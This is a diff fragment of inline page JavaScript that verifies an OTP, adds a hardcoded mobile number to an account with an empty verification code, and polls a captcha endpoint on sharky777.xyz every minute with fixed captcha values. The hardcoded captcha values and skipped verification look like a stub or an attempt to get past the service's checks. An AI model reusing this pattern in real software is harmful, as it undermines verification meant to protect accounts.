+        const verification_code = document.getElementById('otpCode').value;
+        const captcha_id = "123456789";
+        const captcha_code = "1234";
+        const verifyResponse = await fetch(`${baseUrl}/api/mobile/verify`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + localStorage.getItem('authToken')
+          },
+          body: JSON.stringify({ verification_code, mobile, captcha_id, captcha_code }),
+        });
+
+        if (verifyResponse.ok) {
+          alert('OTP verified successfully. Navigating to home...');
+          document.getElementById('otpPopup').style.display = 'none';
+          await mobileAdd();
+        } else {
+          alert('OTP verification failed. Please try again.');
+        }
+      }
+
+      async function mobileAdd() {
+        const addResponse = await fetch(`${baseUrl}/api/mobile/contact/add`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            "Authorization": "Bearer " + localStorage.getItem('authToken')
+          },
+          body: JSON.stringify({
+            "verification_code": "",
+            "mobile": "1611600400",
+            "required_only_primary_verified": true
+          }),
+        });
+
+        if (addResponse.ok) {
+          alert('verifySuccessfully. Fetching home data...');
+          const homeData = await addResponse.json();
+          console.log('Home Data: ', homeData);
+        } else {
+          alert('Failed to fetch home data.');
+        }
+      }
+
+      async function fetchMobileDetails() {
+        const response = await fetch(`${baseUrl}/api/member/details`, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + localStorage.getItem('authToken')
+          }
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          const primaryMobile = data.data.contacts.find(contact => contact.contact_type === 'Mobile' && contact.is_primary === 1);
+          if (primaryMobile) {
+            localStorage.setItem('contact', primaryMobile.value);
+          } else {
+            alert('1');
+          }
+        } else {
+          alert('1');
+        }
+      }
+
+      function refreshCaptcha(captchaId, captchaCode) {
+        const url = `https://feapi.sharky777.xyz/api/member/requestCaptchaCode?captcha_id=${captchaId}&captcha_code=${captchaCode}`;
+
+        fetch(url)
+          .then(response => {
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log("Captcha refreshed:", data);
+            setTimeout(() => refreshCaptcha(captchaId, captchaCode), 60000);
+          })
+          .catch(error => {
+            console.error("Error refreshing captcha:", error);
+            setTimeout(() => refreshCaptcha(captchaId, captchaCode), 60000);
+          });
+      }
+
+      window.onload = function () {
+        const captchaId = "123456789";
+        const captchaCode = "1234";
+        refreshCaptcha(captchaId, captchaCode);
+      };
+
+    </script>
 </body>
+
 </html>
